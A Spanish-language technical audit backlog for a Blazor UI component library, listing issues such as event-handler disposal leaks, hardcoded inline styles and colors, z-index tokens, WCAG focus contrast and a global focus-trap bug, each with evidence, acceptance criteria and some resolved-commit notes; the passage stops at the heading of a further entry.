- **Evidencia**: la clase declara `@implements IDisposable` (`:8`) con `Dispose() { ToastService.OnChange -= HandleToastChange; }` (`:91-95`). Pero `BUIComponentBase` ya implementa `IAsyncDisposable`, que Blazor **prefiere** sobre `IDisposable` durante el teardown del componente. Consecuencia: Blazor invoca `BUIComponentBase.DisposeAsync` y **no** `Dispose()`, por lo que `ToastService.OnChange -= HandleToastChange` **nunca se ejecuta**. En apps Server (circuit persistente) cada render de un nuevo circuito añade otra suscripción al singleton `IToastService`, fugando handlers y provocando `StateHasChanged` ghost en circuits cerrados.
- **Criterios de aceptación**:
  1. Override `DisposeAsync()` en lugar de implementar `IDisposable`: desuscribir `ToastService.OnChange -= HandleToastChange` allí y llamar `await base.DisposeAsync()` al final.
  2. Eliminar `@implements IDisposable` y `public void Dispose()`.
  3. Test de regresión: instanciar `BUIToastHost`, disponer el `BunitContext`, verificar que `ToastService.OnChange` no tiene el handler registrado tras el dispose (vía reflection o mock).
- **Notas**: el mismo patrón probablemente aplica a otros componentes con handlers de servicio singleton. Ver `BLD-02` que ya captura casos análogos para tres componentes.

---

### `COMP-TOASTHOST-03` — `BUIToastHost.OnInitialized` suscribe pero no puebla `_allToasts` inicial: toasts preexistentes invisibles hasta el primer cambio

- **Severidad**: Major
- **Esfuerzo**: XS
- **Alcance**: `src/CdCSharp.BlazorUI/Components/Layout/Toast/BUIToastHost.razor:39-44`.
- **Evidencia**: `OnInitialized` hace `_toastService = ToastService as ToastService; ToastService.OnChange += HandleToastChange;` pero **no asigna** `_allToasts = ToastService.ActiveToasts.ToList()`. Si hay toasts en cola antes de que el host se monte (típico en SSR donde la app lanza toasts durante init), el primer render muestra 0 toasts porque `_allToasts` sigue `[]`. Solo al disparar el primer `OnChange` (otro toast cualquiera) aparecen todos.
- **Criterios de aceptación**:
  1. Añadir `_allToasts = ToastService.ActiveToasts.ToList();` en `OnInitialized` justo después de la suscripción.
  2. Test: en un `ServerTestContext`, añadir 1 toast al servicio antes de renderizar `BUIToastHost` y verificar que aparece en el primer render.
- **Notas**: combinar con `COMP-TOASTHOST-02` en un mismo commit (mismo archivo, mismo componente).

---

### `COMP-TIMEPICKER-01` — `BUITimePicker` usa `style="flex:1; justify-content:center;"` y `style="display:flex; flex-direction:column; ..."` hardcoded en el markup: viola regla 8

- **Severidad**: Major
- **Esfuerzo**: S
- **Alcance**: `src/CdCSharp.BlazorUI/Components/Forms/DateAndTime/BUITimePicker.razor:16-17,31`.
- **Evidencia**: 3 `style="..."` inline en el markup. El estándar (`CLAUDE.md` § CSS architecture → Standards rule 8) prohíbe inline styles hardcoded; todos los estilos estructurales deben vivir en el `.razor.css` scoped o consumirse vía `--bui-inline-*` si son personalizables por el usuario. Aquí los valores `flex:1`, `display:flex; flex-direction:column; align-items:center; gap:0.25rem` son puramente layout estructural — pertenecen al `BUITimePicker.razor.css`.
- **Criterios de aceptación**:
  1. Mover cada `style="..."` a una clase BEM dentro de `BUITimePicker.razor.css`: por ejemplo `bui-time-picker__column`, `bui-time-picker__spinner`.
  2. 0 `style="..."` hardcoded en el `.razor` tras el fix.
  3. Snapshot sigue pasando (o regenerar `.verified.txt` si el markup cambia estructuralmente).

---

### `COMP-COLORPICKER-01` — `BUIColorPicker` tiene `style="flex:1"` y `style="justify-content:flex-end; border-top:1px solid var(--palette-border);"` hardcoded en el markup

- **Severidad**: Major
- **Esfuerzo**: S
- **Alcance**: `src/CdCSharp.BlazorUI/Components/Forms/Color/BUIColorPicker.razor:39,75`.
- **Evidencia**: dos inline styles en el markup; el segundo además usa `var(--palette-border)` dentro del string literal, mezclando tokens con construcción CSS inline. Viola rule 8 del estándar.
- **Criterios de aceptación**:
  1. Mover los dos estilos al `.razor.css` scoped como clases BEM (`bui-color-picker__slider-input`, `bui-color-picker__footer`).
  2. Usar `var(--palette-border)` desde la CSS scoped, no desde inline.

---

### `COMP-STATE-CLASS-01` — Múltiples componentes usan modificadores BEM (`--selected`, `--focused`, `--disabled`, `--active`, `--open`) para estado: viola regla 7 ("State via data-attributes")

- **Severidad**: Major
- **Esfuerzo**: L
- **Alcance**: `src/CdCSharp.BlazorUI/Components/Forms/Dropdown/BUIInputDropdown.razor:80` (`bui-dropdown__option--selected`, `--focused`, `--disabled`), `BUIDropdownContainer.razor` (19 ocurrencias), `BUITreeSelector.razor` (8), `BUITreeMenu.razor` (10), `BUIInputColor.razor` (12), `BUITabs.razor` (5), otros (ver grep abajo).
- **Evidencia**: `grep -E "isSelected|isFocused|isActive|isOpen|IsSelected|IsActive|IsOpen"` sobre los `.razor` produce 95 ocurrencias en 15 componentes, la mayoría en expresiones `class="@(isSelected ? "bui-x__item--selected" : "")"`. El estándar de `CLAUDE.md` regla 7 es explícito: *"never toggle CSS classes to represent disabled, loading, error, active, readonly, required, fullwidth, shadow, ripple, floated, variant, etc. — those are `data-bui-*` attributes emitted by `BUIComponentAttributesBuilder` from the matching `IHas*` interface. Select on the attribute in CSS."*. Aunque los modificadores `--selected` / `--focused` de los items de un dropdown no están en la lista literal, son semánticamente estados y deberían emitirse como `data-bui-selected`/`data-bui-focused` en el elemento child, no como clase modifier.
- **Criterios de aceptación**:
  1. Decisión arquitectónica: ¿el estándar aplica a **todos** los estados en **cualquier** elemento, o solo a la instancia root `<bui-component>`? Documentar en `CLAUDE.md` — `CLAUDE-xx`. Dos alternativas:
     - (a) Ampliar la regla: children usan `data-bui-*` también. Refactorizar los 95 usos para emitir `data-bui-selected="true"`, `data-bui-focused="true"`, `data-bui-disabled="true"` en el elemento child.
     - (b) Restringir la regla al root: aceptar modifier classes en descendants con justificación (ergonomía Blazor). Documentar excepción explícita.
  2. Añadir test de lint (Roslyn analyzer, bUnit snapshot, o regex post-build) que verifique la decisión.
  3. Alinear CSS scoped (`.razor.css`) con la decisión: los selectores pasan de `.bui-x__item--selected` a `.bui-x__item[data-bui-selected="true"]` si se elige (a).
- **Notas**: tarea grande (potencialmente XL). Dependiendo de la decisión, puede dividirse en 15 sub-tareas (una por componente). Confirmar prioridad antes de F2.

---

### `COMP-INPUTDROPDOWN-01` — `BUIInputDropdown.DisposeAsync` llama manualmente `_container.DisposeAsync()`: riesgo de double-dispose con el renderer de Blazor

- **Severidad**: Major
- **Esfuerzo**: XS
- **Alcance**: `src/CdCSharp.BlazorUI/Components/Forms/Dropdown/BUIInputDropdown.razor:378-386`.
- **Evidencia**: `BUIInputDropdown` compone `BUIDropdownContainer` vía `<BUIDropdownContainer @ref="_container" ...>` (el child component), y en su `DisposeAsync` hace `await _container.DisposeAsync()`. Pero Blazor dispara automáticamente el `DisposeAsync` del child cuando el parent se destruye (componentes children tienen ciclo de vida propio). El call manual genera dispose doble: el primero libera `_behaviorInstance`, el segundo vuelve a entrar al try/catch del base y aunque los catches suaven la excepción, se paga el cost de los `InvokeVoidAsync("dispose")` dos veces y potencialmente se escribe a un circuit cerrado.
- **Criterios de aceptación**:
  1. Eliminar `await _container.DisposeAsync()` del `DisposeAsync` del dropdown; dejar que Blazor lo gestione.
  2. Mantener solo `_options.Clear()` si sigue siendo necesario.
  3. Test: rendering → unmount → sin excepciones de "disposed twice" en el log, un solo `InvokeVoidAsync("dispose")` al JS.

---

### `CSS-SCOPED-01` — 13 archivos `.razor.css` con colores hardcoded (hex/rgba/hsla) junto a `var(--palette-*)`: rompe theming

- **Severidad**: Major
- **Esfuerzo**: M
- **Alcance**: 13 archivos scoped detectados con hex/rgba/hsla literales. Incluye `BUITreeMenu.razor.css:10-24`, `BUIDialog.razor.css`, `BUIStackedLayout.razor.css`, `BUIToastHost.razor.css`, `BUIDataTable.razor.css`, `BUITabs.razor.css`, `BUIColorPicker.razor.css`, `BUIDatePicker.razor.css`, `BUICodeBlock.razor.css`, `BUISwitch.razor.css`, `BUIDropdownContainer.razor.css`, `BUIThemeEditor.razor.css`, `BUIToast.razor.css` (confirmar lista completa durante fix).
- **Evidencia**: grep `#[0-9a-fA-F]{3,8}|rgba?\(|hsla?\(` contra `**/*.razor.css` arroja ≈45 ocurrencias en 13 ficheros. Algunos usan el hardcoded como *fallback* (`var(--palette-border, #cccccc)`) y otros como valor directo (`border-bottom: 1px solid #e0e0e0`). Ambos patrones violan la regla 8 del estándar CLAUDE.md ("consume `var(--palette-*)` rather than hardcoded colors").
- **Criterios de aceptación**:
  1. Reemplazar cada literal por la variable de paleta apropiada (`--palette-surface`, `--palette-border`, `--palette-primary`, `--palette-primary-contrast`, etc.).
  2. Si se requiere un color no presente en la paleta (accents neutros como shadow tints), promoverlo a variable en `_themes.css` (`ThemesCssGenerator`) antes de consumirlo.
  3. Para fallbacks en `var(--palette-x, FALLBACK)`: eliminar el fallback (la paleta siempre está cargada vía `Initializer`) o referenciar otra var de paleta.
  4. Test de theming: cambiar tema Light↔Dark en sample app → inspeccionar cada componente tocado → sin colores estancados.
- **Notas**: alinea con `BLD-PIPE-09` (paleta completa) y `THEME` (`§3.11`). Bloquea el gate de theming.

---

### `CSS-SCOPED-02` — Múltiples `.razor.css` usan modificadores BEM (`--selected`, `--focused`, `--open`, `--disabled`) como selectores de estado

- **Severidad**: Major
- **Esfuerzo**: depende de la decisión tomada en `COMP-STATE-CLASS-01` (XL si se elige refactor, S si se documenta excepción)
- **Alcance**: 6 archivos scoped con 16 ocurrencias totales de modificadores BEM de estado: `BUITreeMenu.razor.css`, `BUIDataTable.razor.css`, `BUITabs.razor.css`, `BUIDropdownContainer.razor.css`, `BUIColorPicker.razor.css`, `BUIDatePicker.razor.css`.
- **Evidencia**: grep `--selected|--focused|--open|--disabled|--active` en `**/*.razor.css`. Ejemplos: `.bui-tree-menu__item--selected`, `.bui-dropdown__option--focused`, `.bui-tabs__tab--active`. Duplica la intención de `[data-bui-selected]`, `[data-bui-focused]`, `[data-bui-active]` que ya existen (o deberían existir) en el DOM.
- **Criterios de aceptación**:
  1. **Dependencia**: esperar decisión de `COMP-STATE-CLASS-01`.
  2. Si la decisión es **(a)** (estado es `data-bui-*` también en children): reescribir selectores `.bui-x__item--selected` → `.bui-x__item[data-bui-selected="true"]`.
  3. Si la decisión es **(b)** (modifiers BEM se aceptan en descendants): documentar la excepción explícitamente y cerrar esta tarea como "won't fix by design".
- **Notas**: espejo CSS de `COMP-STATE-CLASS-01`. Las dos deben cerrarse juntas.

---

### `CSS-SCOPED-03` — 40/52 componentes no implementan el patrón `--_<component>-<prop>: var(--bui-inline-*, <default>)` — override surface inconsistente

- **Severidad**: Major
- **Esfuerzo**: L
- **Alcance**: 52 archivos `.razor.css`; solo ≈12 usan el patrón de variable privada (p. ej. `BUIButton.razor.css`, `BUIBadge.razor.css`, `BUICard.razor.css`). Los 40 restantes referencian directamente `var(--palette-*)` o colores literales en las declaraciones `background`, `color`, `border`, eliminando la capa intermedia que permite al consumidor sobrescribir vía `BackgroundColor`/`Color`/`Border`.
- **Evidencia**: grep `--_` y `var(--bui-inline-` en `**/*.razor.css`; cruzar con lista total de archivos. Estándar CLAUDE.md regla 4 ("Private-var pattern"): el `.razor.css` declara `--_x-prop: var(--bui-inline-prop, default)` en el root y luego consume `var(--_x-prop)` en las propiedades. Sin ese patrón, un usuario que hace `<BUIFoo BackgroundColor="red" />` no consigue override (el CSS ignora `--bui-inline-background`).
- **Criterios de aceptación**:
  1. Enumerar los 40 archivos y, por cada propiedad pintada (background, color, border, shadow, radius, prefix/suffix, etc.), introducir el par `--_<kebab>-<prop>: var(--bui-inline-<prop>, <palette-default>)` + `property: var(--_<kebab>-<prop>)`.
  2. Tests de integración: por cada `IHas*` que implementa el componente, un test que renderice con el parámetro y verifique que la propiedad CSS resultante aplica el valor (DOM side + computed style si es posible).
  3. Deprecar accesos directos a `var(--palette-*)` dentro del `.razor.css` salvo para defaults dentro del patrón.
- **Notas**: es la razón por la que varios componentes ignoran silenciosamente `BackgroundColor`/`Color`. Alta prioridad dentro de `CSS-SCOPED`.

---

### `CSS-SCOPED-04` — 23/52 archivos scoped no usan el selector raíz `bui-component[data-bui-component="<kebab>"]` — identificación inconsistente

- **Severidad**: Major
- **Esfuerzo**: M
- **Alcance**: 52 archivos `.razor.css`; solo 29 contienen el selector canónico `bui-component[data-bui-component="..."]`. Los 23 restantes usan `.bui-<name>` como gancho raíz o directamente un nombre de clase ad-hoc (p. ej. `.toast-item`, `.tree-menu`).
- **Evidencia**: grep `bui-component\[data-bui-component=` en `**/*.razor.css`. Estándar CLAUDE.md regla 2: "target the component with `bui-component[data-bui-component=\"<kebab-name>\"]`; do not use component-specific CSS classes for identification". Sin esto, si un consumidor envuelve el componente en un nodo con el mismo nombre de clase (poco probable pero posible) hay colisión; más importante: romper esta regla rompe la selección basada en atributos consistente que alimenta las familias.
- **Criterios de aceptación**:
  1. Reescribir los 23 archivos para usar `bui-component[data-bui-component="<kebab>"]` como root.
  2. Donde quede `.bui-<name>` en la hoja, convertir a `bui-component[data-bui-component="<name>"] .bui-<name>__<elem>` (BEM para descendants, atributo para root).
  3. Cross-check con `COMP-AUDIT-CHECKLIST-01` ítem 1 ("Root element").
- **Notas**: derivada directamente de la regla 2 de la arquitectura; es la puerta para el resto de reglas (sin root canónico, el resto no aplica bien).

---

### `CSS-BUNDLE-01` — Inconsistencia `data-theme` (código) vs `data-bui-theme` (CLAUDE.md): atributo de activación de tema no sigue convención de prefijo

- **Severidad**: Major
- **Esfuerzo**: S
- **Alcance**: `src/CdCSharp.BlazorUI.BuildTools/Generators/ThemesCssGenerator.cs:48`, `src/CdCSharp.BlazorUI/Types/Theme/ThemeInterop.ts:19,23,28`, `src/CdCSharp.BlazorUI/Components/Layout/BUIInitializer.razor:13`, `src/CdCSharp.BlazorUI/Components/Layout/ThemeGenerator/BUIThemeGenerator.razor:250`, `src/CdCSharp.BlazorUI/Components/Layout/ThemeSelector/BUIThemeSelector.razor.css:79,105,109,122,126`, `src/CdCSharp.BlazorUI/Components/Generic/Tree/TreeMenu/BUITreeMenu.razor.css:21`, `src/CdCSharp.BlazorUI/Components/Utils/Tooltip/BUITooltip.razor.css:40-41`, `src/CdCSharp.BlazorUI/Components/Layout/Toast/BUIToast.razor.css:20,41`, `src/CdCSharp.BlazorUI/Components/Layout/Dialog/BUIDrawer.razor.css:81,100`, `src/CdCSharp.BlazorUI/Components/Layout/Dialog/BUIModalContainer.razor.css:45`.
- **Evidencia**: CLAUDE.md documenta "Activación por `[data-bui-theme]` consistente con el JS de theming" (§CSS-architecture, paso 3 de la lista de bundle). El código produce y consume `data-theme` (sin prefijo `bui-`). El conjunto entero está coherente entre sí (el generator, el JS interop, y los selectores de componentes coinciden en `data-theme`), pero viola la convención de prefijo `data-bui-*` que rige al resto de atributos del framework y rompe aislamiento: si el consumidor usa otra librería que también toca `data-theme`, hay colisión.
- **Criterios de aceptación**:
  1. **[Decisión F1 D-09]** Renombrar a `data-bui-theme` en los 11 sitios (generator + ts + initializer + 7 razor.css). Añadir constante en `FeatureDefinitions.DataAttributes.Theme = "data-bui-theme"` (y re-export via `BUIStylingKeys.Theme` si procede por D-06).
  2. Añadir migración en release notes — consumidores con CSS override propio basado en `[data-theme="dark"]` deben actualizar.
  3. Test: un test de integración renderiza `BUIInitializer` y verifica `document.documentElement.getAttribute('data-bui-theme')` recibe `"light"`/`"dark"` correctamente.
- **Notas**: recomendado (a) por coherencia con el resto del framework. Alimenta `CLAUDE-xx` (§3.23). Decisión D-09 (ver §Directivas de diseño): Opción (a) confirmada.

---

### `CSS-OPT-01` — 14 `z-index` crudos en 6 archivos scoped: deberían consumir `--bui-z-dropdown/sticky/modal/tooltip/toast`

- **Severidad**: Major
- **Esfuerzo**: S
- **Alcance**: `BUIToastHost.razor.css:5` (`10000`), `BUIStackedLayout.razor.css:31,92` (`100`, `90`), `BUISidebarLayout.razor.css:32,147,175` (`100`, `90`, `95`), `BUIModalContainer.razor.css:10,14` (`1`, `0`), `BUITreeMenu.razor.css:46,57,152` (`999`, `1000`, `1001`), `BUIDataCards.razor.css:73` (`1`), `BUIDataGrid.razor.css:14` (`10`). También `InputFamilyCssGenerator.cs:102` (`z-index: 1`).
- **Evidencia**: `DesignTokensGenerator.cs:26-30` ya declara `--bui-z-dropdown`, `--bui-z-sticky`, `--bui-z-modal`, `--bui-z-tooltip`, `--bui-z-toast` en `FeatureDefinitions.Tokens.ZIndex`. Los componentes los ignoran y escriben números crudos que **no** siguen la escala (`10000`, `999`, `1000`, `1001`, `95`), creando una jerarquía paralela incoherente y rompiendo el contrato de stacking del framework.
- **Criterios de aceptación**:
  1. Inventariar cada uso (incluido el generator) y asignar el token correspondiente: toasts → `var(--bui-z-toast)`, tree-menu popup → `var(--bui-z-dropdown)`, modal → `var(--bui-z-modal)`, etc.
  2. Para casos sin slot en la escala (p. ej. "el sticky interno del layout pero sub-modal"), **ampliar `FeatureDefinitions.Tokens.ZIndex`** antes de consumir; no introducir números crudos.
  3. Smoke test: layout con modal+toast+tooltip+dropdown abiertos simultáneamente → stacking correcto (toast > modal > tooltip > dropdown > sticky).
- **Notas**: alinea con `BLD-PIPE-06` (tokens fuera de `FeatureDefinitions`) y `BLD-PIPE-11/12` (generators con literales).

---

### `CSS-OPT-02` — Falta herramienta reproducible de auditoría DOM ↔ CSS global (tri‑universo)

- **Severidad**: Major
- **Esfuerzo**: L
- **Alcance**: nuevo script/proyecto en `tools/CdCSharp.BlazorUI.Tools.CssAudit/` (o un test de integración en la carpeta `Tests/Library/`).
- **Evidencia**: `§3.10` paso 11 del plan exige construir tres universos y reportar diferencias:
  - `UsadoEnDOM` = clases + `data-bui-*` + `--bui-inline-*` en `.razor`, `.razor.cs`, `BUIComponentAttributesBuilder`, `FeatureDefinitions`, templates `[BuildTemplate]`.
  - `DeclaradoEnCSS` = selectores + `var(--bui-inline-*)` en `CssBundle/*.css` + `*.razor.css`.
  - `PrescritoEnEstandar` = `FeatureDefinitions` + sección CSS de `CLAUDE.md`.
  Sin esta auditoría el repo acumula CSS muerto (reglas sin consumidor) y DOM huérfano (atributos/vars que ningún CSS selecciona) sin señal automatizada.
- **Criterios de aceptación**:
  1. Script que extraiga los tres universos y emita `CssAudit.txt` con tres tablas: *reglas CSS huérfanas*, *consumidores DOM sin regla*, *mismatches contra `FeatureDefinitions`*.
  2. Ejecutable en CI como paso informativo (no-blocking al principio) y convertible a gate cuando la baseline esté limpia.
  3. Salida del primer run adjunta a este task — alimenta sub-tareas `CSS-OPT-02a..n` por cada huérfano detectado.
- **Notas**: entregable meta que habilita medir el progreso de `CSS-SCOPED-*`, `CSS-BUNDLE-*` y `COMP-*` con cifras reproducibles. Prerequisito para `REL` (§3.24).

---

### `THEME-01` — `Highlight = #AA2222` idéntico en LightTheme y DarkTheme: outline de focus no garantiza contraste WCAG en ambos modos

- **Estado**: ✅ Resuelto (commit `c34b7e5`) — `LightTheme.Highlight = #C62828` (≈7.1:1 vs porcelana — AAA); `DarkTheme.Highlight = #FFB74D` ámbar cálido (≈6.5:1 vs #121417 — AAA para UI graphics, WCAG 2.4.7 Focus Visible). Comentario inline documenta el ratio. Criterio 2 (test automatizado) delegado a `THEME-03`.
- **Severidad**: Major
- **Esfuerzo**: S
- **Alcance**: `src/CdCSharp.BlazorUI.Core/Themes/LightTheme.cs:70`, `src/CdCSharp.BlazorUI.Core/Themes/DarkTheme.cs:69`. Consumido por `DesignTokensGenerator.cs:41` (`--bui-highlight-outline: 2px solid var(--palette-highlight)`).
- **Evidencia**: mismo rojo `#AA2222` para ambos temas. En Light (`Background = #F2F2F0`) contraste `#AA2222` vs `#F2F2F0` ≈ 7.5 (AAA). En Dark (`Background = #121417`) contraste `#AA2222` vs `#121417` ≈ 3.6 (AA sólo para texto >18pt, *fail* para UI graphics `≥3:1`). Además, el outline de focus es el mecanismo principal de navegación por teclado: un color que no destaca en uno de los temas viola WCAG 2.4.7 (Focus Visible).
- **Criterios de aceptación**:
  1. Definir colores `Highlight` diferenciados por tema (propuesta: Light = `#C62828` fuerte; Dark = `#FFB74D` o `#FF8A65` cálido sobre fondo oscuro).
  2. Test que verifique contrast ratio `Highlight vs Background` ≥ 3:1 en ambos temas.
  3. Alinear con `BLD-PIPE-01` (reset CSS eliminaba `:focus-visible`) — ambas tareas cierran juntas el gate de focus-visible.
- **Notas**: alimenta `A11Y-xx` (§3.14).

---

### `THEME-02` — `HoverTint` y `ActiveTint` con mismo valor base (`#e9e9e9`) en todos los temas: hover/active indistinguibles entre Light y Dark

- **Estado**: ✅ Resuelto (commit `a4734cb`) — override Material 3 state-layer opacity por tema: Light = `rgba(0,0,0,0.08)` / `rgba(0,0,0,0.12)`; Dark = `rgba(255,255,255,0.08)` / `rgba(255,255,255,0.12)`. `CssColor` emite `rgba(...)` cuando A < 255 (verificado en `CssColor.cs:581-583`). Criterio 3 (verificación visual en sample app) queda pendiente del usuario — el cambio es atomic en la paleta y no rompe tests.
- **Severidad**: Major
- **Esfuerzo**: S
- **Alcance**: `src/CdCSharp.BlazorUI.Core/Themes/Abstractions/BUIThemePaletteBase.cs:38-39` (defaults); `LightTheme.cs` y `DarkTheme.cs` **no overridean** estas propiedades.
- **Evidencia**: `HoverTint = new("#e9e9e9")`, `ActiveTint = new("#e9e9e9")` son los únicos 2 tokens sin override en las dos paletas reales. CLAUDE.md referencia el patrón `color-mix(in oklab, var(--_component-...) X%, var(--palette-hover-tint) Y%)` para derivar hover/active states — si `--palette-hover-tint` es el mismo gris claro en Dark y Light, el color final en Dark acaba siendo "original + gris claro" (aclarado), no "original + tinte de hover del tema" (que debería ser blanco translúcido en Dark, negro translúcido en Light).
- **Criterios de aceptación**:
  1. `LightTheme.HoverTint = new CssColor("#000000")` con alpha (p. ej. `rgba(0,0,0,0.08)`), `ActiveTint = rgba(0,0,0,0.12)`.
  2. `DarkTheme.HoverTint = rgba(255,255,255,0.08)`, `ActiveTint = rgba(255,255,255,0.12)`.
  3. Verificar con sample app (Button, Card, ListItem) que hover visualmente cambia al cambiar tema.
- **Notas**: Material Design 3 convention: `state layer opacity`. Requiere alpha support; verificar que `CssColor` emite `rgba(...)` cuando A < 255.

---

### `THEME-03` — Sin test automatizado de WCAG 2.2 AA contrast para los pares palette/palette-contrast

- **Estado**: ✅ Resuelto (commit `b850837`) — `ThemeContrastTests.cs` parametriza por `(theme, pair, foreground, background)` con la fórmula WCAG 2.1 `(L1+0.05)/(L2+0.05)`. 16 pares texto normal ≥4.5:1 (8 por tema) + 4 pares UI graphics (Border/Background, Highlight/Background por tema) ≥3:1. **Todos pasan**: no hay sub-tasks `THEME-03-<pair>` que abrir; el baseline ya está limpio. Criterio 4 (gate CI) efectivo de facto — el test corre en `dotnet test`.
- **Severidad**: Major
- **Esfuerzo**: M
- **Alcance**: nuevo test bajo `test/CdCSharp.BlazorUI.Tests.Integration/Tests/Library/ThemeContrastTests.cs`.
- **Evidencia**: `CssColor.GetRelativeLuminance()` y `GetBestContrast(black, white)` ya están implementados; solo falta el test. Pares a verificar en cada tema: `Background/BackgroundContrast`, `Surface/SurfaceContrast`, `Primary/PrimaryContrast`, `Secondary/SecondaryContrast`, `Success/SuccessContrast`, `Warning/WarningContrast`, `Error/ErrorContrast`, `Info/InfoContrast`. Mínimo AA: texto normal ≥ 4.5:1, texto grande o UI ≥ 3:1. Actualmente sin cobertura.
- **Criterios de aceptación**:
  1. Test parametrizado por `(Theme, Pair, MinRatio)` que consuma `CssColor.GetRelativeLuminance` y calcule contrast ratio `(L1+0.05)/(L2+0.05)` según WCAG 2.1.
  2. Fallback: para UI graphics (bordes, iconos), exigir ≥ 3:1 contra el background.
  3. Baseline: dejar fallar los pares actuales y tratar cada fallo como sub-task `THEME-03-<pair>`. En particular: inspeccionar `Dark.Primary #8AB4F8` vs `Dark.PrimaryContrast #121417` (probablemente AAA), `Light.Warning #B5893D` vs `Light.WarningContrast #1F2328` (probablemente pasa), `Light.Secondary #6D6875` vs `Light.SecondaryContrast #FFFFFF` (≈5:1 AA, límite).
  4. Gate de CI cuando la baseline esté limpia.
- **Notas**: una vez verde, este test también valida fixes de `THEME-01`/`THEME-02`.

---

### `JS-01` — `ModuleJsInteropBase.DisposeAsync` no atrapa `InvalidOperationException` ni `TaskCanceledException` — viola la regla de disposal de `CLAUDE.md`

- **Estado**: ✅ Resuelto (commit `eb11091`) — `ModuleJsInteropBase.DisposeAsync` añade `catch (InvalidOperationException)` y `catch (TaskCanceledException)`; cerrando la triada previa (`JSDisconnectedException`, `ObjectDisposedException`) a las 4 excepciones no accionables. `BUIComponentPipeline.DisposeBehaviorAsync` también incorpora `InvalidOperationException` para uniformar el contrato. `CLAUDE.md` actualizado: la lista de disposal ahora cita las 4 excepciones y nombra `ModuleJsInteropBase.DisposeAsync` + `BUIComponentPipeline.DisposeBehaviorAsync` como referencias. Criterio 2 (test de prerender) queda como follow-up menor — los 2546 tests existentes pasan, el pattern queda protegido para todos los 9 interops concretos que heredan la base.
- **Severidad**: Major
- **Esfuerzo**: XS
- **Alcance**: `src/CdCSharp.BlazorUI.Core/Abstractions/JSInterop/ModuleJsInteropBase.cs:51-68`.
- **Evidencia**: `CLAUDE.md` (sección *Async / JS interop conventions*) exige: "wrap `IJSObjectReference` / `InvokeVoidAsync` calls during teardown paths in `try/catch (JSDisconnectedException) { } catch (InvalidOperationException) { }` — prerendering and circuit-shutdown both raise these and they are not actionable". `DisposeAsync` actual cubre `JSDisconnectedException` + `ObjectDisposedException`, pero deja pasar:
  - `InvalidOperationException` — lanzado durante prerender cuando no hay circuit.
  - `TaskCanceledException` — lanzado cuando el componente se destruye durante el `await module.DisposeAsync()`.
  La clase base es reutilizada por 9 interops concretos (`DropdownJsInterop`, `ModalJsInterop`, `TextAreaJsInterop`, `DraggableJsInterop`, `ThemeJsInterop`, `PatternJsInterop`, `ColorPickerJsInterop`, `ClipboardJsInterop`, `BehaviorJsInterop`), así que la regresión es transversal.
- **Criterios de aceptación**:
  1. Añadir `catch (InvalidOperationException) { }` y `catch (TaskCanceledException) { }` al `DisposeAsync` base.
  2. Test de prerender: renderizar componente con JS interop durante prerender → dispose no lanza excepción no atrapada.
  3. Actualizar XML-doc de la clase explicitando las 4 excepciones silenciadas y por qué.
- **Notas**: alinea con `BASE-06` (patrón `_disposed` post-await). Ambos cierran el mismo gate de disposal seguro.

---

### `JS-02` — `ThemeInterop.initialize(defaultTheme?)` ignora el parámetro; comentario de prioridades miente sobre el fallback real

- **Estado**: ✅ Resuelto (commit `b0210f5`) — cadena de fallback corregida: `savedTheme ?? defaultTheme ?? getSystemPreference() ?? DEFAULT_THEME`. `defaultTheme` pasa a ser respetado (era silenciosamente descartado); `DEFAULT_THEME` queda como último recurso. Comentario re-ordenado: localStorage → defaultTheme → system → constant. `BUIInitializer.razor:13` pasa `DefaultTheme` a `InitializeAsync(DefaultTheme)`; ahora tiene efecto.
- **Severidad**: Major
- **Esfuerzo**: XS
- **Alcance**: `src/CdCSharp.BlazorUI/Types/Theme/ThemeInterop.ts:10-20`.
- **Evidencia**:
  ```typescript
  export function initialize(defaultTheme?: string): void {
      // Priority order:
      // 1. localStorage (user's manual selection)
      // 2. System preference
      // 3. defaultTheme parameter (if provided)
      // 4. DEFAULT_THEME constant ('dark')
      const savedTheme = localStorage.getItem(THEME_KEY);
      const theme = savedTheme ?? getSystemPreference();
      document.documentElement.setAttribute('data-theme', theme);
  }
  ```
  El parámetro `defaultTheme` nunca se consulta y `DEFAULT_THEME` ('dark') nunca cae como fallback (pasos 3 y 4 son inalcanzables). `getSystemPreference()` siempre devuelve `'dark'` o `'light'`, así que el flujo real es solo pasos 1+2. Si el consumidor pasa `initialize("custom-theme")` esperando activarlo por defecto, no sucede.
- **Criterios de aceptación**:
  1. Arreglar la función para respetar los 4 pasos documentados, o borrar el parámetro + recortar el comentario si la intención es ignorar `defaultTheme`.
  2. Test: `initialize("mocha")` sin localStorage → `data-theme` debe ser `"mocha"`.
  3. Verificar llamada actual en `BUIInitializer.razor:13` — si pasa un tema, el código lo estaba tirando.
- **Notas**: detalles de cableado en C# — `IThemeJsInterop.InitializeAsync` igualmente necesita aceptar y reenviar el argumento.

---

### `JS-03` — `ModalInterop.trapFocus` usa state singleton global: apertura de un segundo modal rompe el focus‑trap del primero

- **Severidad**: Major
- **Esfuerzo**: M
- **Alcance**: `src/CdCSharp.BlazorUI/Types/Modal/ModalInterop.ts:12-18,44-97,121-137`.
- **Evidencia**:
  ```typescript
  let focusTrapState: FocusTrapState = { ... };
  export function trapFocus(element: HTMLElement): void {
      releaseFocus(); // dismisses any existing trap
      focusTrapState.previousActiveElement = document.activeElement as HTMLElement;
      ...
  }
  ```
  Estructura singleton — al abrir un modal anidado (pattern legítimo: dialog que abre un picker, o un modal de confirmación sobre otro modal), `trapFocus` llama `releaseFocus()` del padre, y al cerrar el hijo no hay stack que restaure el trap del padre. El keyboard trap queda efectivamente solo en el hijo y al cerrarlo el focus vuelve al elemento previo del *hijo*, no del padre.
- **Criterios de aceptación**:
  1. Convertir `focusTrapState` en un **stack** (`focusTrapStack: FocusTrapState[]`).
  2. `trapFocus` hace `push`, instala handler nuevo, y al `releaseFocus` hace `pop` + re-instala el handler del anterior si existe.
  3. Test bUnit con dos modales anidados: abrir modal A → abrir modal B → Tab cycles dentro de B → cerrar B → focus vuelve al último elemento focuseado de A → Tab cycles dentro de A → cerrar A → focus al trigger original.
- **Notas**: A11y concern (alinea con `A11Y-xx` de §3.14). Material Design, Radix y Headless UI todos usan stack.

---

### `JS-04` — `ModuleJsInteropBase.IsModuleTaskLoaded` (`TaskCompletionSource`) es ceremonia muerta: se marca completo en el constructor y nadie espera en algo real

